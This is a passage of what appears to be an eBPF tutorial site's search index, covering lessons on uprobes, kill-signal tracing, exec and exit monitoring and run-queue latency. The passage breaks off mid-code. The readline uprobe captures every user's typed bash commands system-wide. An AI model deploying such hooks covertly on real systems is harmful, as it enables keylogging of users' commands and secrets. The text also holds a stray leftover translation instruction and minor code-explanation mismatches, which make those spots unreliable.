</p>"},{"location":"tutorials/5-uprobe-bashreadline/","title":"eBPF Tutorial by Example 5: Capturing readline Function Calls with Uprobe","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool on the Linux kernel that allows developers to dynamically load, update, and run user-defined code at runtime.</p> <p>This article is the fifth part of the eBPF Tutorial by Example, which mainly introduces how to capture readline function calls in bash using uprobe.</p>"},{"location":"tutorials/5-uprobe-bashreadline/#what-is-uprobe","title":"What is uprobe","text":"<p>uprobe is a user-space probe that allows dynamic instrumentation in user-space programs. The probe locations include function entry, specific offsets, and function returns. When we define an uprobe, the kernel creates fast breakpoint instructions (int3 instructions on x86 machines) on the attached instructions. When the program executes this instruction, the kernel triggers an event, causing the program to enter kernel mode and call the probe function through a callback function. After executing the probe function, the program returns to user mode to continue executing subsequent instructions.</p> <p>uprobe is file-based. When a function in a binary file is traced, all processes that use the file are instrumented, including those that have not yet been started, allowing system calls to be tracked system-wide.</p> <p>uprobe is suitable for parsing some traffic in user mode that cannot be resolved by kernel mode probes, such as HTTP/2 traffic (where the header is encoded and cannot be decoded by the kernel) and HTTPS traffic (which is encrypted and cannot be decrypted by the kernel). For more information, see the example in eBPF Tutorial by Example: Capturing SSL/TLS Plaintext Data from Multiple Libraries with Uprobe.</p> <p>Uprobe in kernel mode eBPF runtime may also cause relatively large performance overhead. In this case, you can also consider using user mode eBPF runtime, such as bpftime. bpftime is a user mode eBPF runtime based on LLVM JIT/AOT. It can run eBPF programs in user mode and is compatible with kernel mode eBPF, avoiding context switching between kernel mode and user mode, thereby improving the execution efficiency of eBPF programs by 10 times.</p>"},{"location":"tutorials/5-uprobe-bashreadline/#capturing-readline-function-calls-in-bash-using-uprobe","title":"Capturing readline Function Calls in bash using uprobe","text":"<p>uprobe is an eBPF probe used to capture user-space function calls, allowing us to capture system functions called by user-space programs.</p> <p>For example, we can use uprobe to capture readline function calls in bash and get the command line input from the user. The example code is as follows:</p> <pre><code>#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\n#define TASK_COMM_LEN 16\n#define MAX_LINE_SIZE 80\n\nSEC(\"uretprobe//bin/bash:readline\")\nint BPF_KRETPROBE(printret, const void *ret)\n{\n char str[MAX_LINE_SIZE];\n char comm[TASK_COMM_LEN];\n u32 pid;\n\n if (!ret)\n  return 0;\n\n bpf_get_current_comm(&amp;comm, sizeof(comm));\n\n pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n bpf_probe_read_user_str(str, sizeof(str), ret);\n\n bpf_printk(\"PID %d (%s) read: %s \", pid, comm, str);\n\n return 0;\n};\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>The purpose of this code is to execute the specified BPF_PROBE function (printret function) when the readline function in bash returns.</p> <p>In the printret function, we first obtain the process name and process ID of the process calling the readline function. Then, we use the bpf_probe_read_user_str function to read the user input command line string. Lastly, we use the bpf_printk function to print the process ID, process name, and input command line string.</p> <p>In addition, we also need to define the uprobe probe using the SEC macro and define the probe function using the BPF_KRETPROBE macro.In the <code>SEC</code> macro in the code above, we need to specify the type of the uprobe, the path of the binary file to capture, and the name of the function to capture. For example, the definition of the <code>SEC</code> macro in the code above is as follows:</p> <pre><code>SEC(\"uprobe//bin/bash:readline\")\n</code></pre> <p>This indicates that we want to capture the <code>readline</code> function in the <code>/bin/bash</code> binary file.</p> <p>Next, we need to use the <code>BPF_KRETPROBE</code> macro to define the probe function. For example:</p> <pre><code>BPF_KRETPROBE(printret, const void *ret)\n</code></pre> <p>Here, <code>printret</code> is the name of the probe function, and <code>const void *ret</code> is the parameter of the probe function, which represents the return value of the captured function.</p> <p>Then, we use the <code>bpf_get_current_comm</code> function to get the name of the current task and store it in the <code>comm</code> array.</p> <pre><code>bpf_get_current_comm(&amp;comm, sizeof(comm));\n</code></pre> <p>We use the <code>bpf_get_current_pid_tgid</code> function to get the PID of the current process and store it in the <code>pid</code> variable.</p> <pre><code>pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n</code></pre> <p>We use the <code>bpf_probe_read_user_str</code> function to read the return value of the <code>readline</code> function from the user space and store it in the <code>str</code> array.</p> <pre><code>bpf_probe_read_user_str(str, sizeof(str), ret);\n</code></pre> <p>Finally, we use the <code>bpf_printk</code> function to output the PID, task name, and user input string.</p> <pre><code>bpf_printk(\"PID %d (%s) read: %s \", pid, comm, str);\n</code></pre> <p>eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain combined with Wasm. Its purpose is to simplify the development, build, distribution, and running of eBPF programs. You can refer to https://github.com/eunomia-bpf/eunomia-bpf to download and install the ecc compiler toolchain and ecli runtime. We use eunomia-bpf to compile and run this example.</p> <p>Compile and run the above code:</p> <pre><code>$ ecc bashreadline.bpf.c\nCompiling bpf object...\nPacking ebpf object and config into package.json...\n$ sudo ecli run package.json\nRunning eBPF program...\n</code></pre> <p>After running this program, you can view the output of the eBPF program by checking the file <code>/sys/kernel/debug/tracing/trace_pipe</code>:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\n            bash-32969   [000] d..31 64001.375748: bpf_trace_printk: PID 32969 (bash) read: fff \n            bash-32969   [000] d..31 64002.056951: bpf_trace_printk: PID 32969 (bash) read: fff\n</code></pre> <p>You can see that we have successfully captured the <code>readline</code> function call of <code>bash</code> and obtained the command line entered by the user in <code>bash</code>.</p>"},{"location":"tutorials/5-uprobe-bashreadline/#summary","title":"Summary","text":"<p>In the above code, we used the <code>SEC</code> macro to define an uprobe probe, which specifies the user space program (<code>bin/bash</code>) to be captured and the function (<code>readline</code>) to be captured. In addition, we used the <code>BPF_KRETPROBE</code> macro to define a callback function (<code>printret</code>) for handling the return value of the <code>readline</code> function. This function can retrieve the return value of the <code>readline</code> function and print it to the kernel log. In this way, we can use eBPF to capture the <code>readline</code> function call of <code>bash</code> and obtain the command line entered by the user in <code>bash</code>.</p> <p>If you want to learn more about eBPF knowledge and practices, you can visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ to get more examples and complete tutorials.</p> <p>Share on  Share on </p>"},{"location":"tutorials/6-sigsnoop/","title":"eBPF Tutorial by Example 6: Capturing Signal Sending and Store State with Hash Maps","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool on the Linux kernel that allows developers to dynamically load, update, and run user-defined code at runtime.</p> <p>This article is the sixth part of the eBPF Tutorial by Example. It mainly introduces how to implement an eBPF tool that captures a collection of system calls that send signals to processes and uses a hash map to store state.</p>"},{"location":"tutorials/6-sigsnoop/#sigsnoop","title":"sigsnoop","text":"<p>The example code is as follows:</p> <pre><code>#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\n#define MAX_ENTRIES 10240\n#define TASK_COMM_LEN 16\n\nstruct event {\n unsigned int pid;\n unsigned int tpid;\n int sig;\n int ret;\n char comm[TASK_COMM_LEN];\n};\n\nstruct {\n __uint(type, BPF_MAP_TYPE_HASH);\n __uint(max_entries, MAX_ENTRIES);\n __type(key, __u32);\n __type(value, struct event);\n} values SEC(\".maps\");\n\n\nstatic int probe_entry(pid_t tpid, int sig)\n{\n struct event event = {};\n __u64 pid_tgid;\n __u32 tid;\n\n pid_tgid = bpf_get_current_pid_tgid();\n tid = (__u32)pid_tgid;\n event.pid = pid_tgid &gt;&gt; 32;\n event.tpid = tpid;\n event.sig = sig;\n bpf_get_current_comm(event.comm, sizeof(event.comm));\n bpf_map_update_elem(&amp;values, &amp;tid, &amp;event, BPF_ANY);\n return 0;\n}\n\nstatic int probe_exit(void *ctx, int ret)\n{\n __u64 pid_tgid = bpf_get_current_pid_tgid();\n __u32 tid = (__u32)pid_tgid;\n struct event *eventp;\n\n eventp = bpf_map_lookup_elem(&amp;values, &amp;tid);\n if (!eventp)\n  return 0;\n\n eventp-&gt;ret = ret;\n bpf_printk(\"PID %d (%s) sent signal %d \",\n           eventp-&gt;pid, eventp-&gt;comm, eventp-&gt;sig);\n bpf_printk(\"to PID %d, ret = %d\",\n           eventp-&gt;tpid, ret);\n\ncleanup:\n bpf_map_delete_elem(&amp;values, &amp;tid);\n return 0;\n}\n\nSEC(\"tracepoint/syscalls/sys_enter_kill\")\nint kill_entry(struct trace_event_raw_sys_enter *ctx)\n{\n pid_t tpid = (pid_t)ctx-&gt;args[0];\n int sig = (int)ctx-&gt;args[1];\n\n return probe_entry(tpid, sig);\n}\n\nSEC(\"tracepoint/syscalls/sys_exit_kill\")\nint kill_exit(struct trace_event_raw_sys_exit *ctx)\n{\n return probe_exit(ctx, ctx-&gt;ret);\n}\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n</code></pre> <p>The above code defines an eBPF program for capturing system calls that send signals to processes, including kill, tkill, and tgkill. It captures the enter and exit events of system calls by using tracepoints, and executes specified probe functions such as <code>probe_entry</code> and <code>probe_exit</code> when these events occur.</p> <p>In the probe function, we use the bpf_map to store the captured event information, including the process ID of the sending signal, the process ID of the receiving signal, the signal value, and the name of the executable for the current task. When the system call exits, we retrieve the event information stored in the bpf_map and use bpf_printk to print the process ID, process name, sent signal, and return value of the system call.</p> <p>Finally, we also need to use the SEC macro to define the probe and specify the name of the system call to be captured and the probe function to be executed.</p> <p>eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain that combines with Wasm. Its purpose is to simplify the development, building, distribution, and running of eBPF programs. You can refer to https://github.com/eunomia-bpf/eunomia-bpf for downloading and installing the ecc compilation toolchain and ecli runtime. We use eunomia-bpf to compile and run this example.</p> <p>Compile and run the above code:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p>or</p> <pre><code>$ ecc sigsnoop.bpf.c\nCompiling bpf object...\nGenerating export types...\nPacking ebpf object and config into package.json...\n$ sudo ecli run package.json\nRunning eBPF program...\n</code></pre> <p>After running this program, you can view the output of the eBPF program by checking the /sys/kernel/debug/tracing/trace_pipe file:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\n    systemd-journal-363     [000] d...1   672.563868: bpf_trace_printk: PID 363 (systemd-journal) sent signal 0\n     systemd-journal-363     [000] d...1   672.563869: bpf_trace_printk: to PID 1400, ret = 0\n     systemd-journal-363     [000] d...1   672.563870: bpf_trace_printk: PID 363 (systemd-journal) sent signal 0\n     systemd-journal-363     [000] d...1   672.563870: bpf_trace_printk: to PID 1527, ret = -3\n</code></pre>"},{"location":"tutorials/6-sigsnoop/#summary","title":"Summary","text":"<p>This article mainly introduces how to implement an eBPF tool to capture the collection of system calls sent by processes using signals and save the state using a hash map. Using a hash map requires defining a struct:</p> <pre><code>struct {\n __uint(type, BPF_MAP_TYPE_HASH);\n __uint(max_entries, MAX_ENTRIES);\n __type(key, __u32);\n __type(value, struct event);\n} values SEC(\".maps\");\n</code></pre> <p>And using corresponding APIs for access, such as bpf_map_lookup_elem, bpf_map_update_elem, bpf_map_delete_elem, etc.</p> <p>If you want to learn more about eBPF knowledge and practice, you can visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ to get more examples and complete tutorials.</p> <p>Share on  Share on </p>"},{"location":"tutorials/7-execsnoop/","title":"eBPF Tutorial by Example 7: Capturing Process Execution, Output with perf event array","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool on the Linux kernel that allows developers to dynamically load, update, and run user-defined code at runtime.</p> <p>This article is the seventh part of the eBPF Tutorial by Example and mainly introduces how to capture process execution events in the Linux kernel and print output to the user command line via a perf event array. This eliminates the need to view the output of eBPF programs by checking the <code>/sys/kernel/debug/tracing/trace_pipe</code> file. After sending information to user space via the perf event array, complex data processing and analysis can be performed.</p>"},{"location":"tutorials/7-execsnoop/#perf-buffer","title":"perf buffer","text":"<p>eBPF provides two circular buffers for transferring information from eBPF programs to user space controllers. The first one is the perf circular buffer, which has existed since at least kernel v4.15. The second one is the BPF circular buffer introduced later. This article only considers the perf circular buffer.</p>"},{"location":"tutorials/7-execsnoop/#execsnoop","title":"execsnoop","text":"<p>To print output to the user command line via the perf event array, a header file and a C source file need to be written. The example code is as follows:</p> <p>Header file: execsnoop.h</p> <pre><code>#ifndef __EXECSNOOP_H\n#define __EXECSNOOP_H\n\n#define TASK_COMM_LEN 16\n\nstruct event {\n    int pid;\n    int ppid;\n    int uid;\n    int retval;\n    bool is_exit;\n    char comm[TASK_COMM_LEN];\n};\n\n#endif /* __EXECSNOOP_H */\n</code></pre> <p>Source file: execsnoop.bpf.c</p> <pre><code>// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include \"execsnoop.h\"\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);\n    __uint(key_size, sizeof(u32));\n    __uint(value_size, sizeof(u32));\n} events SEC(\".maps\");\n\nSEC(\"tracepoint/syscalls/sys_enter_execve\")\nint tracepoint_syscalls_sys_enter_execve(struct trace_event_raw_sys_enter* ctx)\n{\n    u64 id;\n    pid_t pid, tgid;\n    struct event event={0};\n    struct task_struct *task;\n\n    uid_t uid = (u32)bpf_get_current_uid_gid();\n    id = bpf_get_current_pid_tgid();\n    tgid = id &gt;&gt; 32;\n\n    event.pid = tgid;\n    event.uid = uid;\n    task = (struct task_struct*)bpf_get_current_task();\n    event.ppid = BPF_CORE_READ(task, real_parent, tgid);\n    char *cmd_ptr = (char *) BPF_CORE_READ(ctx, args[0]);\n    bpf_probe_read_str(&amp;event.comm, sizeof(event.comm), cmd_ptr);\n    bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU, &amp;event, sizeof(event));\n    return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>This code defines an eBPF program for capturing the entry of the <code>execve</code> system call.</p> <p>In the entry program, we first obtain the process ID and user ID of the current process, then use the <code>bpf_get_current_task</code> function to obtain the <code>task_struct</code> structure of the current process, and use the <code>bpf_probe_read_str</code> function to read the process name. Finally, we use the <code>bpf_perf_event_output</code> function to output the process execution event to the perf buffer.</p> <p>With this code, we can capture process execution events in the Linux kernel and analyze the process execution conditions.Instructions: Translate the following Chinese text to English while maintaining the original formatting:</p> <p>We use eunomia-bpf to compile and execute this example. You can refer to the following link to download and install the ecc compilation toolchain and ecli runtime: https://github.com/eunomia-bpf/eunomia-bpf.</p> <p>Compile using a container:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p>Or compile using ecc:</p> <pre><code>ecc execsnoop.bpf.c execsnoop.h\n</code></pre> <p>Run:</p> <pre><code>$ sudo ./ecli run package.json \nTIME     PID     PPID    UID     COMM    \n21:28:30  40747  3517    1000    node\n21:28:30  40748  40747   1000    sh\n21:28:30  40749  3517    1000    node\n21:28:30  40750  40749   1000    sh\n21:28:30  40751  3517    1000    node\n21:28:30  40752  40751   1000    sh\n21:28:30  40753  40752   1000    cpuUsage.sh\n</code></pre>"},{"location":"tutorials/7-execsnoop/#summary","title":"Summary","text":"<p>This article introduces how to capture events of processes running in the Linux kernel and print output to the user command-line using the perf event array. After sending information to the user space via the perf event array, complex data processing and analysis can be performed. In the corresponding kernel code of libbpf, a structure and corresponding header file can be defined as follows:</p> <pre><code>struct {\n __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);\n __uint(key_size, sizeof(u32));\n __uint(value_size, sizeof(u32));\n} events SEC(\".maps\");\n</code></pre> <p>This allows sending information directly to the user space.</p> <p>For more examples and detailed development guide, please refer to the official documentation of eunomia-bpf: https://github.com/eunomia-bpf/eunomia-bpf.</p> <p>If you want to learn more about eBPF knowledge and practice, you can visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial to get more examples and complete tutorials.\"</p> <p>Share on  Share on </p>"},{"location":"tutorials/8-exitsnoop/","title":"eBPF Tutorial by Example 8: Monitoring Process Exit Events, Output with Ring Buffer","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool on the Linux kernel. It allows developers to dynamically load, update, and run user-defined code at runtime in the kernel.</p> <p>This article is the eighth part of the eBPF Tutorial by Example, focusing on monitoring process exit events with eBPF.</p>"},{"location":"tutorials/8-exitsnoop/#ring-buffer","title":"Ring Buffer","text":"<p>There is now a new BPF data structure available called the eBPF ring buffer. It solves the memory efficiency and event reordering issues of the BPF perf buffer, which is currently the de facto standard for sending data from the kernel to user space. It provides compatibility with perf buffer for easy migration while also introducing new reserved/commit APIs for improved usability. Additionally, synthetic and real-world benchmark tests have shown that in nearly all cases, the eBPF ring buffer should be the default choice for sending data from BPF programs to user space.</p>"},{"location":"tutorials/8-exitsnoop/#ebpf-ring-buffer-vs-ebpf-perf-buffer","title":"eBPF Ring Buffer vs eBPF Perf Buffer","text":"<p>Whenever a BPF program needs to send collected data to user space for post-processing and logging, it typically uses the BPF perf buffer (perfbuf). Perfbuf is a collection of per-CPU circular buffers that allow efficient data exchange between the kernel and user space. It works well in practice, but it has two main drawbacks that have proven to be inconvenient: inefficient memory usage and event reordering.</p> <p>To address these issues, starting from Linux 5.8, BPF introduces a new BPF data structure called BPF ring buffer. It is a multiple producer, single consumer (MPSC) queue that can be safely shared across multiple CPUs.</p> <p>The BPF ring buffer supports familiar features from BPF perf buffer:</p> <ul> <li>Variable-length data records.</li> <li>Efficient reading of data from user space through memory-mapped regions without additional memory copies and/or entering kernel system calls.</li> <li>Support for epoll notifications and busy loop operations with absolute minimal latency.</li> </ul> <p>At the same time, the BPF ring buffer solves the following problems of the BPF perf buffer:</p> <ul> <li>Memory overhead.</li> <li>Data ordering.</li> <li>Unnecessary work and additional data copying.</li> </ul>"},{"location":"tutorials/8-exitsnoop/#exitsnoop","title":"exitsnoop","text":"<p>This article is the eighth part of the eBPF Tutorial by Example, focusing on monitoring process exit events with eBPF and using the ring buffer to print output to user space.</p> <p>The steps for printing output to user space using the ring buffer are similar to perf buffer. First, a header file needs to be defined:</p> <p>Header File: exitsnoop.h</p> <pre><code>#ifndef __BOOTSTRAP_H\n#define __BOOTSTRAP_H\n\n#define TASK_COMM_LEN 16\n#define MAX_FILENAME_LEN 127\n\nstruct event {\n    int pid;\n    int ppid;\n    unsigned exit_code;\n    unsigned long long duration_ns;\n    char comm[TASK_COMM_LEN];\n};\n\n#endif /* __BOOTSTRAP_H */\n</code></pre> <p>Source File: exitsnoop.bpf.c</p> <pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include \"exitsnoop.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\nSEC(\"tp/sched/sched_process_exit\")\nint handle_exit(struct trace_event_raw_sched_process_template* ctx)\n{\n    struct task_struct *task;\n    struct event *e;\n    pid_t pid, tid;\n    u64 id, ts, *start_ts, start_time = 0;\n\n    /* get PID and TID of exiting thread/process */\n    id = bpf_get_current_pid_tgid();\n    pid = id &gt;&gt; 32;\n    tid = (u32)id;\n\n    /* ignore thread exits */\n    if (pid != tid)\n        return 0;\n\n    /* reserve sample from BPF ringbuf */\n    e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n    if (!e)\n        return 0;\n\n    /* fill out the sample with data */\n    task = (struct task_struct *)bpf_get_current_task();\n    start_time = BPF_CORE_READ(task, start_time);\n\n    e-&gt;duration_ns = bpf_ktime_get_ns() - start_time;\n    e-&gt;pid = pid;\n    e-&gt;ppid = BPF_CORE_READ(task, real_parent, tgid);\n    e-&gt;exit_code = (BPF_CORE_READ(task, exit_code) &gt;&gt; 8) &amp; 0xff;\n    bpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));\n\n    /* send data to user-space for post-processing */\n    bpf_ringbuf_submit(e, 0);\n    return 0;\n}\n</code></pre> <p>This code demonstrates how to monitor process exit events using exitsnoop and print output to user space using a ring buffer:</p> <ol> <li>First, we include the required headers and exitsnoop.h.</li> <li>We define a global variable named \"LICENSE\" with the content \"Dual BSD/GPL\", which is the license requirement for eBPF programs.</li> <li>We define a mapping named rb of type BPF_MAP_TYPE_RINGBUF, which will be used to transfer data from kernel space to user space. We specify max_entries as 256 * 1024, representing the maximum capacity of the ring buffer.</li> <li>We define an eBPF program named handle_exit, which will be executed when a process exit event is triggered. It takes a trace_event_raw_sched_process_template struct pointer named ctx as the parameter.</li> <li>We use the bpf_get_current_pid_tgid() function to obtain the PID and TID of the current task. For the main thread, the PID and TID are the same; for child threads, they are different. Since we only care about the exit of the process (main thread), we return 0 if the PID and TID are different, ignoring the exit events of child threads.</li> <li>We use the bpf_ringbuf_reserve function to reserve space for the event struct e in the ring buffer. If the reservation fails, we return 0.</li> <li>We use the bpf_get_current_task() function to obtain a task_struct structure pointer for the current task.</li> <li>We fill in the process-related information into the reserved event struct e, including the duration of the process, PID, PPID, exit code, and process name.</li> <li>Finally, we use the bpf_ringbuf_submit function to submit the filled event struct e to the ring buffer, for further processing and output in user space.</li> </ol> <p>This example demonstrates how to capture process exit events using exitsnoop and a ring buffer in an eBPF program, and transfer relevant information to user space. This is useful for analyzing process exit reasons and monitoring system behavior.</p>"},{"location":"tutorials/8-exitsnoop/#compile-and-run","title":"Compile and Run","text":"<p>eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain that combines with Wasm. Its purpose is to simplify the development, build, distribution, and execution of eBPF programs. You can refer to https://github.com/eunomia-bpf/eunomia-bpf to download and install the ecc compiler toolchain and ecli runtime. We will use eunomia-bpf to compile and run this example.</p> <p>Compile:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p>Or</p> <pre><code>$ ecc exitsnoop.bpf.c exitsnoop.h\nCompiling bpf object...\nGenerating export types...\nPacking ebpf object and config into package.json...\n</code></pre> <p>Run:</p> <pre><code>$ sudo ./ecli run package.json \nTIME     PID     PPID    EXIT_CODE  DURATION_NS  COMM\".\n21:40:09  42050  42049   0          0            which\n21:40:09  42049  3517    0          0            sh\n21:40:09  42052  42051   0          0            ps\n21:40:09  42051  3517    0          0            sh\n21:40:09  42055  42054   0          0            sed\n21:40:09  42056  42054   0          0            cat\n21:40:09  42057  42054   0          0            cat\n21:40:09  42058  42054   0          0            cat\n21:40:09  42059  42054   0          0            cat\n</code></pre>"},{"location":"tutorials/8-exitsnoop/#summary","title":"Summary","text":"<p>This article introduces how to develop a simple BPF program using eunomia-bpf that can monitor process exit events in a Linux system and send the captured events to user space programs via a ring buffer. In this article, we compiled and ran this example using eunomia-bpf.</p> <p>To better understand and practice eBPF programming, we recommend reading the official documentation of eunomia-bpf at: https://github.com/eunomia-bpf/eunomia-bpf. Additionally, we provide a complete tutorial and source code for you to view and learn from at https://github.com/eunomia-bpf/bpf-developer-tutorial. We hope this tutorial helps you get started with eBPF development and provides useful references for your further learning and practice.</p> <p>Share on  Share on </p>"},{"location":"tutorials/9-runqlat/","title":"eBPF Tutorial by Example 9: Capturing Scheduling Latency and Recording as Histogram","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool on the Linux kernel. It allows developers to dynamically load, update, and run user-defined code at runtime.</p> <p>runqlat is an eBPF tool used for analyzing the scheduling performance of the Linux system. Specifically, runqlat is used to measure the time a task waits in the run queue before being scheduled to run on a CPU. This information is very useful for identifying performance bottlenecks and improving the overall efficiency of the Linux kernel scheduling algorithm.</p>"},{"location":"tutorials/9-runqlat/#runqlat-principle","title":"runqlat Principle","text":"<p>This tutorial is the ninth part of the eBPF beginner's development series, with the topic \"Capturing Process Scheduling Latency\". Here, we will introduce a program called runqlat, which records process scheduling latency as a histogram.</p> <p>The Linux operating system uses processes to execute all system and user tasks. These processes can be blocked, killed, running, or waiting to run. The number of processes in the latter two states determines the length of the CPU run queue.</p> <p>Processes can have several possible states, such as:</p> <ul> <li>Runnable or running</li> <li>Interruptible sleep</li> <li>Uninterruptible sleep</li> <li>Stopped</li> <li>Zombie process</li> </ul> <p>Processes waiting for resources or other function signals are in the interruptible or uninterruptible sleep state: the process is put to sleep until the resource it needs becomes available. Then, depending on the type of sleep, the process can transition to the runnable state or remain asleep.</p> <p>Even when a process has all the resources it needs, it does not start running immediately. It transitions to the runnable state and is queued together with other processes in the same state. The CPU can execute these processes in the next few seconds or milliseconds. The scheduler arranges the processes for the CPU and determines the next process to run.</p> <p>Depending on the hardware configuration of the system, the length of this runnable queue (known as the CPU run queue) can be short or long. A short run queue length indicates that the CPU is not being fully utilized. On the other hand, if the run queue is long, it may mean that the CPU is not powerful enough to handle all the processes or that the number of CPU cores is insufficient. In an ideal CPU utilization, the length of the run queue will be equal to the number of cores in the system.</p> <p>Process scheduling latency, also known as \"run queue latency,\" is the time it takes for a thread to go from becoming runnable (e.g., receiving an interrupt that prompts it to do more work) to actually running on the CPU. In the case of CPU saturation, you can imagine that the thread has to wait for its turn. But in other peculiar scenarios, this can also happen, and in some cases, it can be reduced by tuning to improve the overall system performance.</p> <p>We will illustrate how to use the runqlat tool through an example. This is a heavily loaded system:</p> <pre><code># runqlat\nTracing run queue latency... Hit Ctrl-C to end.\n^C\n     usecs               : count     distribution\n         0 -&gt; 1          : 233      |***********                             |\n         2 -&gt; 3          : 742      |************************************    |\n         4 -&gt; 7          : 203      |**********                              |\n         8 -&gt; 15         : 173      |********                                |\n        16 -&gt; 31         : 24       |*                                       |\n        32 -&gt; 63         : 0        |                                        |\n        64 -&gt; 127        : 30       |*                                       |\n       128 -&gt; 255        : 6        |                                        |\n       256 -&gt; 511        : 3        |                                        |\n       512 -&gt; 1023       : 5        |                                        |\n      1024 -&gt; 2047       : 27       |*                                       |\n</code></pre>"},{"location":"tutorials/9-runqlat/#runqlat-code-implementation","title":"runqlat Code Implementation","text":""},{"location":"tutorials/9-runqlat/#runqlatbpfc","title":"runqlat.bpf.c","text":"<p>First, we need to write a source code file <code>runqlat.bpf.c</code>:</p> <pre><code>// SPDX-License-Identifier: GPL-2.0\n// Copyright (c) 2020 Wenbo Zhang\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include \"runqlat.h\"\n#include \"bits.bpf.h\"\n#include \"maps.bpf.h\"\n#include \"core_fixes.bpf.h\"\n\n#define MAX_ENTRIES 10240\n#define TASK_RUNNING  0\n\nconst volatile bool filter_cg = false;\nconst volatile bool targ_per_process = false;\nconst volatile bool targ_per_thread = false;\nconst volatile bool targ_per_pidns = false;\nconst volatile bool targ_ms = false;\nconst volatile pid_t targ_tgid = 0;\n\nstruct {\n __uint(type, BPF_MAP_TYPE_CGROUP_ARRAY);\n __type(key, u32);\n __type(value, u32);\n __uint(max_entries, 1);\n} cgroup_map SEC(\".maps\");\n\nstruct {\n __uint(type, BPF_MAP_TYPE_HASH);\n __uint(max_entries, MAX_ENTRIES);\n __type(key, u32);\n __type(value, u64);\n} start SEC(\".maps\");\n\nstatic struct hist zero;\n\n/// @sample {\"interval\": 1000, \"type\" : \"log2_hist\"}\nstruct {\n __uint(type, BPF_MAP_TYPE_HASH);\n __uint(max_entries, MAX_ENTRIES);\n __type(key, u32);\n __type(value, struct hist);\n} hists SEC(\".maps\");\n\nstatic int trace_enqueue(u32 tgid, u32 pid)\n{\nu64 ts;\n\nif (!pid)\n  return 0;\nif (targ_tgid &amp;&amp; targ_tgid != tgid)\n  return 0;\n\nts = bpf_ktime_get_ns();\nbpf_map_update_elem(&amp;start, &amp;pid, &amp;ts, BPF_ANY);\nreturn 0;\n}\n\nstatic unsigned int pid_namespace(struct task_struct *task)\n{\nstruct pid *pid;\nunsigned int level;\nstruct upid upid;\nunsigned int inum;\n\n/*  get the pid namespace by following task_active_pid_ns(),\n *  pid-&gt;numbers[pid-&gt;level].ns\n */\npid = BPF_CORE_READ(task, thread_pid);\nlevel = BPF_CORE_READ(pid, level);\nbpf_core_read(&amp;upid, sizeof(upid), &amp;pid-&gt;numbers[level]);\ninum = BPF_CORE_READ(upid.ns, ns.inum);\n\nreturn inum;\n}\n\nstatic int handle_switch(bool preempt, struct task_struct *prev, struct task_struct *next)\n{\nstruct hist *histp;\nu64 *tsp, slot;\nu32 pid, hkey;\ns64 delta;\n\nif (filter_cg &amp;&amp; !bpf_current_task_under_cgroup(&amp;cgroup_map, 0))\n  return 0;\n\nif (get_task_state(prev) == TASK_RUNNING)\n  trace_enqueue(BPF_CORE_READ(prev, tgid), BPF_CORE_READ(prev, pid));\n\npid = BPF_CORE_READ(next, pid);\n\ntsp = bpf_map_lookup_elem(&amp;start, &amp;pid);\nif (!tsp)\n  return 0;\ndelta = bpf_ktime_get_ns() - *tsp;\nif (delta &lt; 0)\n  goto cleanup;\n\nif (targ_per_process)\n  hkey = BPF_CORE_READ(next, tgid);\nelse if (targ_per_thread)\n  hkey = pid;\nelse if (targ_per_pidns)\n  hkey = pid_namespace(next);\nelse\n  hkey = -1;\nhistp = bpf_map_lookup_or_try_init(&amp;hists, &amp;hkey, &amp;zero);\nif (!histp)\n  goto cleanup;\nif (!histp-&gt;comm[0])\n  bpf_probe_read_kernel_str(&amp;histp-&gt;comm, sizeof(histp-&gt;comm),\n     